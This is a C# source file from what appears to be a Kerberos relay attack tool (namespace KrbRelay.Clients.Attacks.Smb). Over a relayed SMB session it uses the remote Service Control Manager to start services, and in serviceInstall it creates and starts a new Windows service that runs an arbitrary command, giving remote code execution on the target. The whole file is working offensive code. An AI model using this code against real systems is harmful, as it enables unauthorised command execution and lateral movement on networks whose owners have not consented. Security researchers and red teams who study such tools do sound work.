using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Client.Helpers;
using SMBLibrary.Services;
using System;

namespace KrbRelay.Clients.Attacks.Smb
{
    internal class ServiceManager
    {
        public static bool startService(SMB2Client smbClient, string serviceName)
        {
            using (RPCCallHelper rpc = new RPCCallHelper(smbClient, ScmrService.ServicePipeName, ScmrService.ServiceInterfaceGuid, ScmrService.ServiceVersion))
            {
                var status = rpc.BindPipe();
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Could not bind to SCMR");
                    return false;
                }

                var lpScHandle = ScmrServiceHelper.rOpenSCManagerW(rpc, out status);
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Could open SCMR handle");
                    return false;
                }
                var serviceHandle = ScmrServiceHelper.rOpenServiceW(rpc, lpScHandle, serviceName, out status);
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out var temp);
                    Console.WriteLine("[-] Could not open service handle, wrong name?");
                    return false;
                }

                NTStatus startStatus = NTStatus.STATUS_ACCESS_DENIED;
                var service = ScmrServiceHelper.rQueryServiceStatus(rpc, serviceHandle, out status);
                if (service.dwCurrentState == 0x00000001)
                {
                    startStatus = ScmrServiceHelper.rStartServiceW(rpc, serviceHandle);
                }

                ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out var status2);
                ScmrServiceHelper.rCloseServiceHandle(rpc, serviceHandle, out status2);

                if (service.dwCurrentState == 0x00000004 || startStatus == NTStatus.STATUS_SUCCESS)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        public static void serviceInstall(SMB2Client smb2, string serviceName, string cmd)
        {
            using (RPCCallHelper rpc = new RPCCallHelper(smb2, ScmrService.ServicePipeName, ScmrService.ServiceInterfaceGuid, ScmrService.ServiceVersion))
            {
                var status = rpc.BindPipe();
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Could not bind to SCMR");
                    return;
                }
                var lpScHandle = ScmrServiceHelper.rOpenSCManagerW(rpc, out status);
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to open SCMR handle: {0}", status);
                    return;
                }
                var newHandle = ScmrServiceHelper.rCreateServiceW(rpc, lpScHandle, $"{serviceName}\x00", cmd, out status);
                if (status != NTStatus.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to create service: {0}", status);
                }
                else
                {
                    status = ScmrServiceHelper.rStartServiceW(rpc, newHandle);
                    if (status != NTStatus.STATUS_SUCCESS)
                    {
                        Console.WriteLine("[-] Service failed to start: {0}", status);
                    }
                    else
                    {
                        Console.WriteLine("[+] Service started");
                    }
                }

                ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out status);
                ScmrServiceHelper.rCloseServiceHandle(rpc, newHandle, out status);
            }
        }
    }
}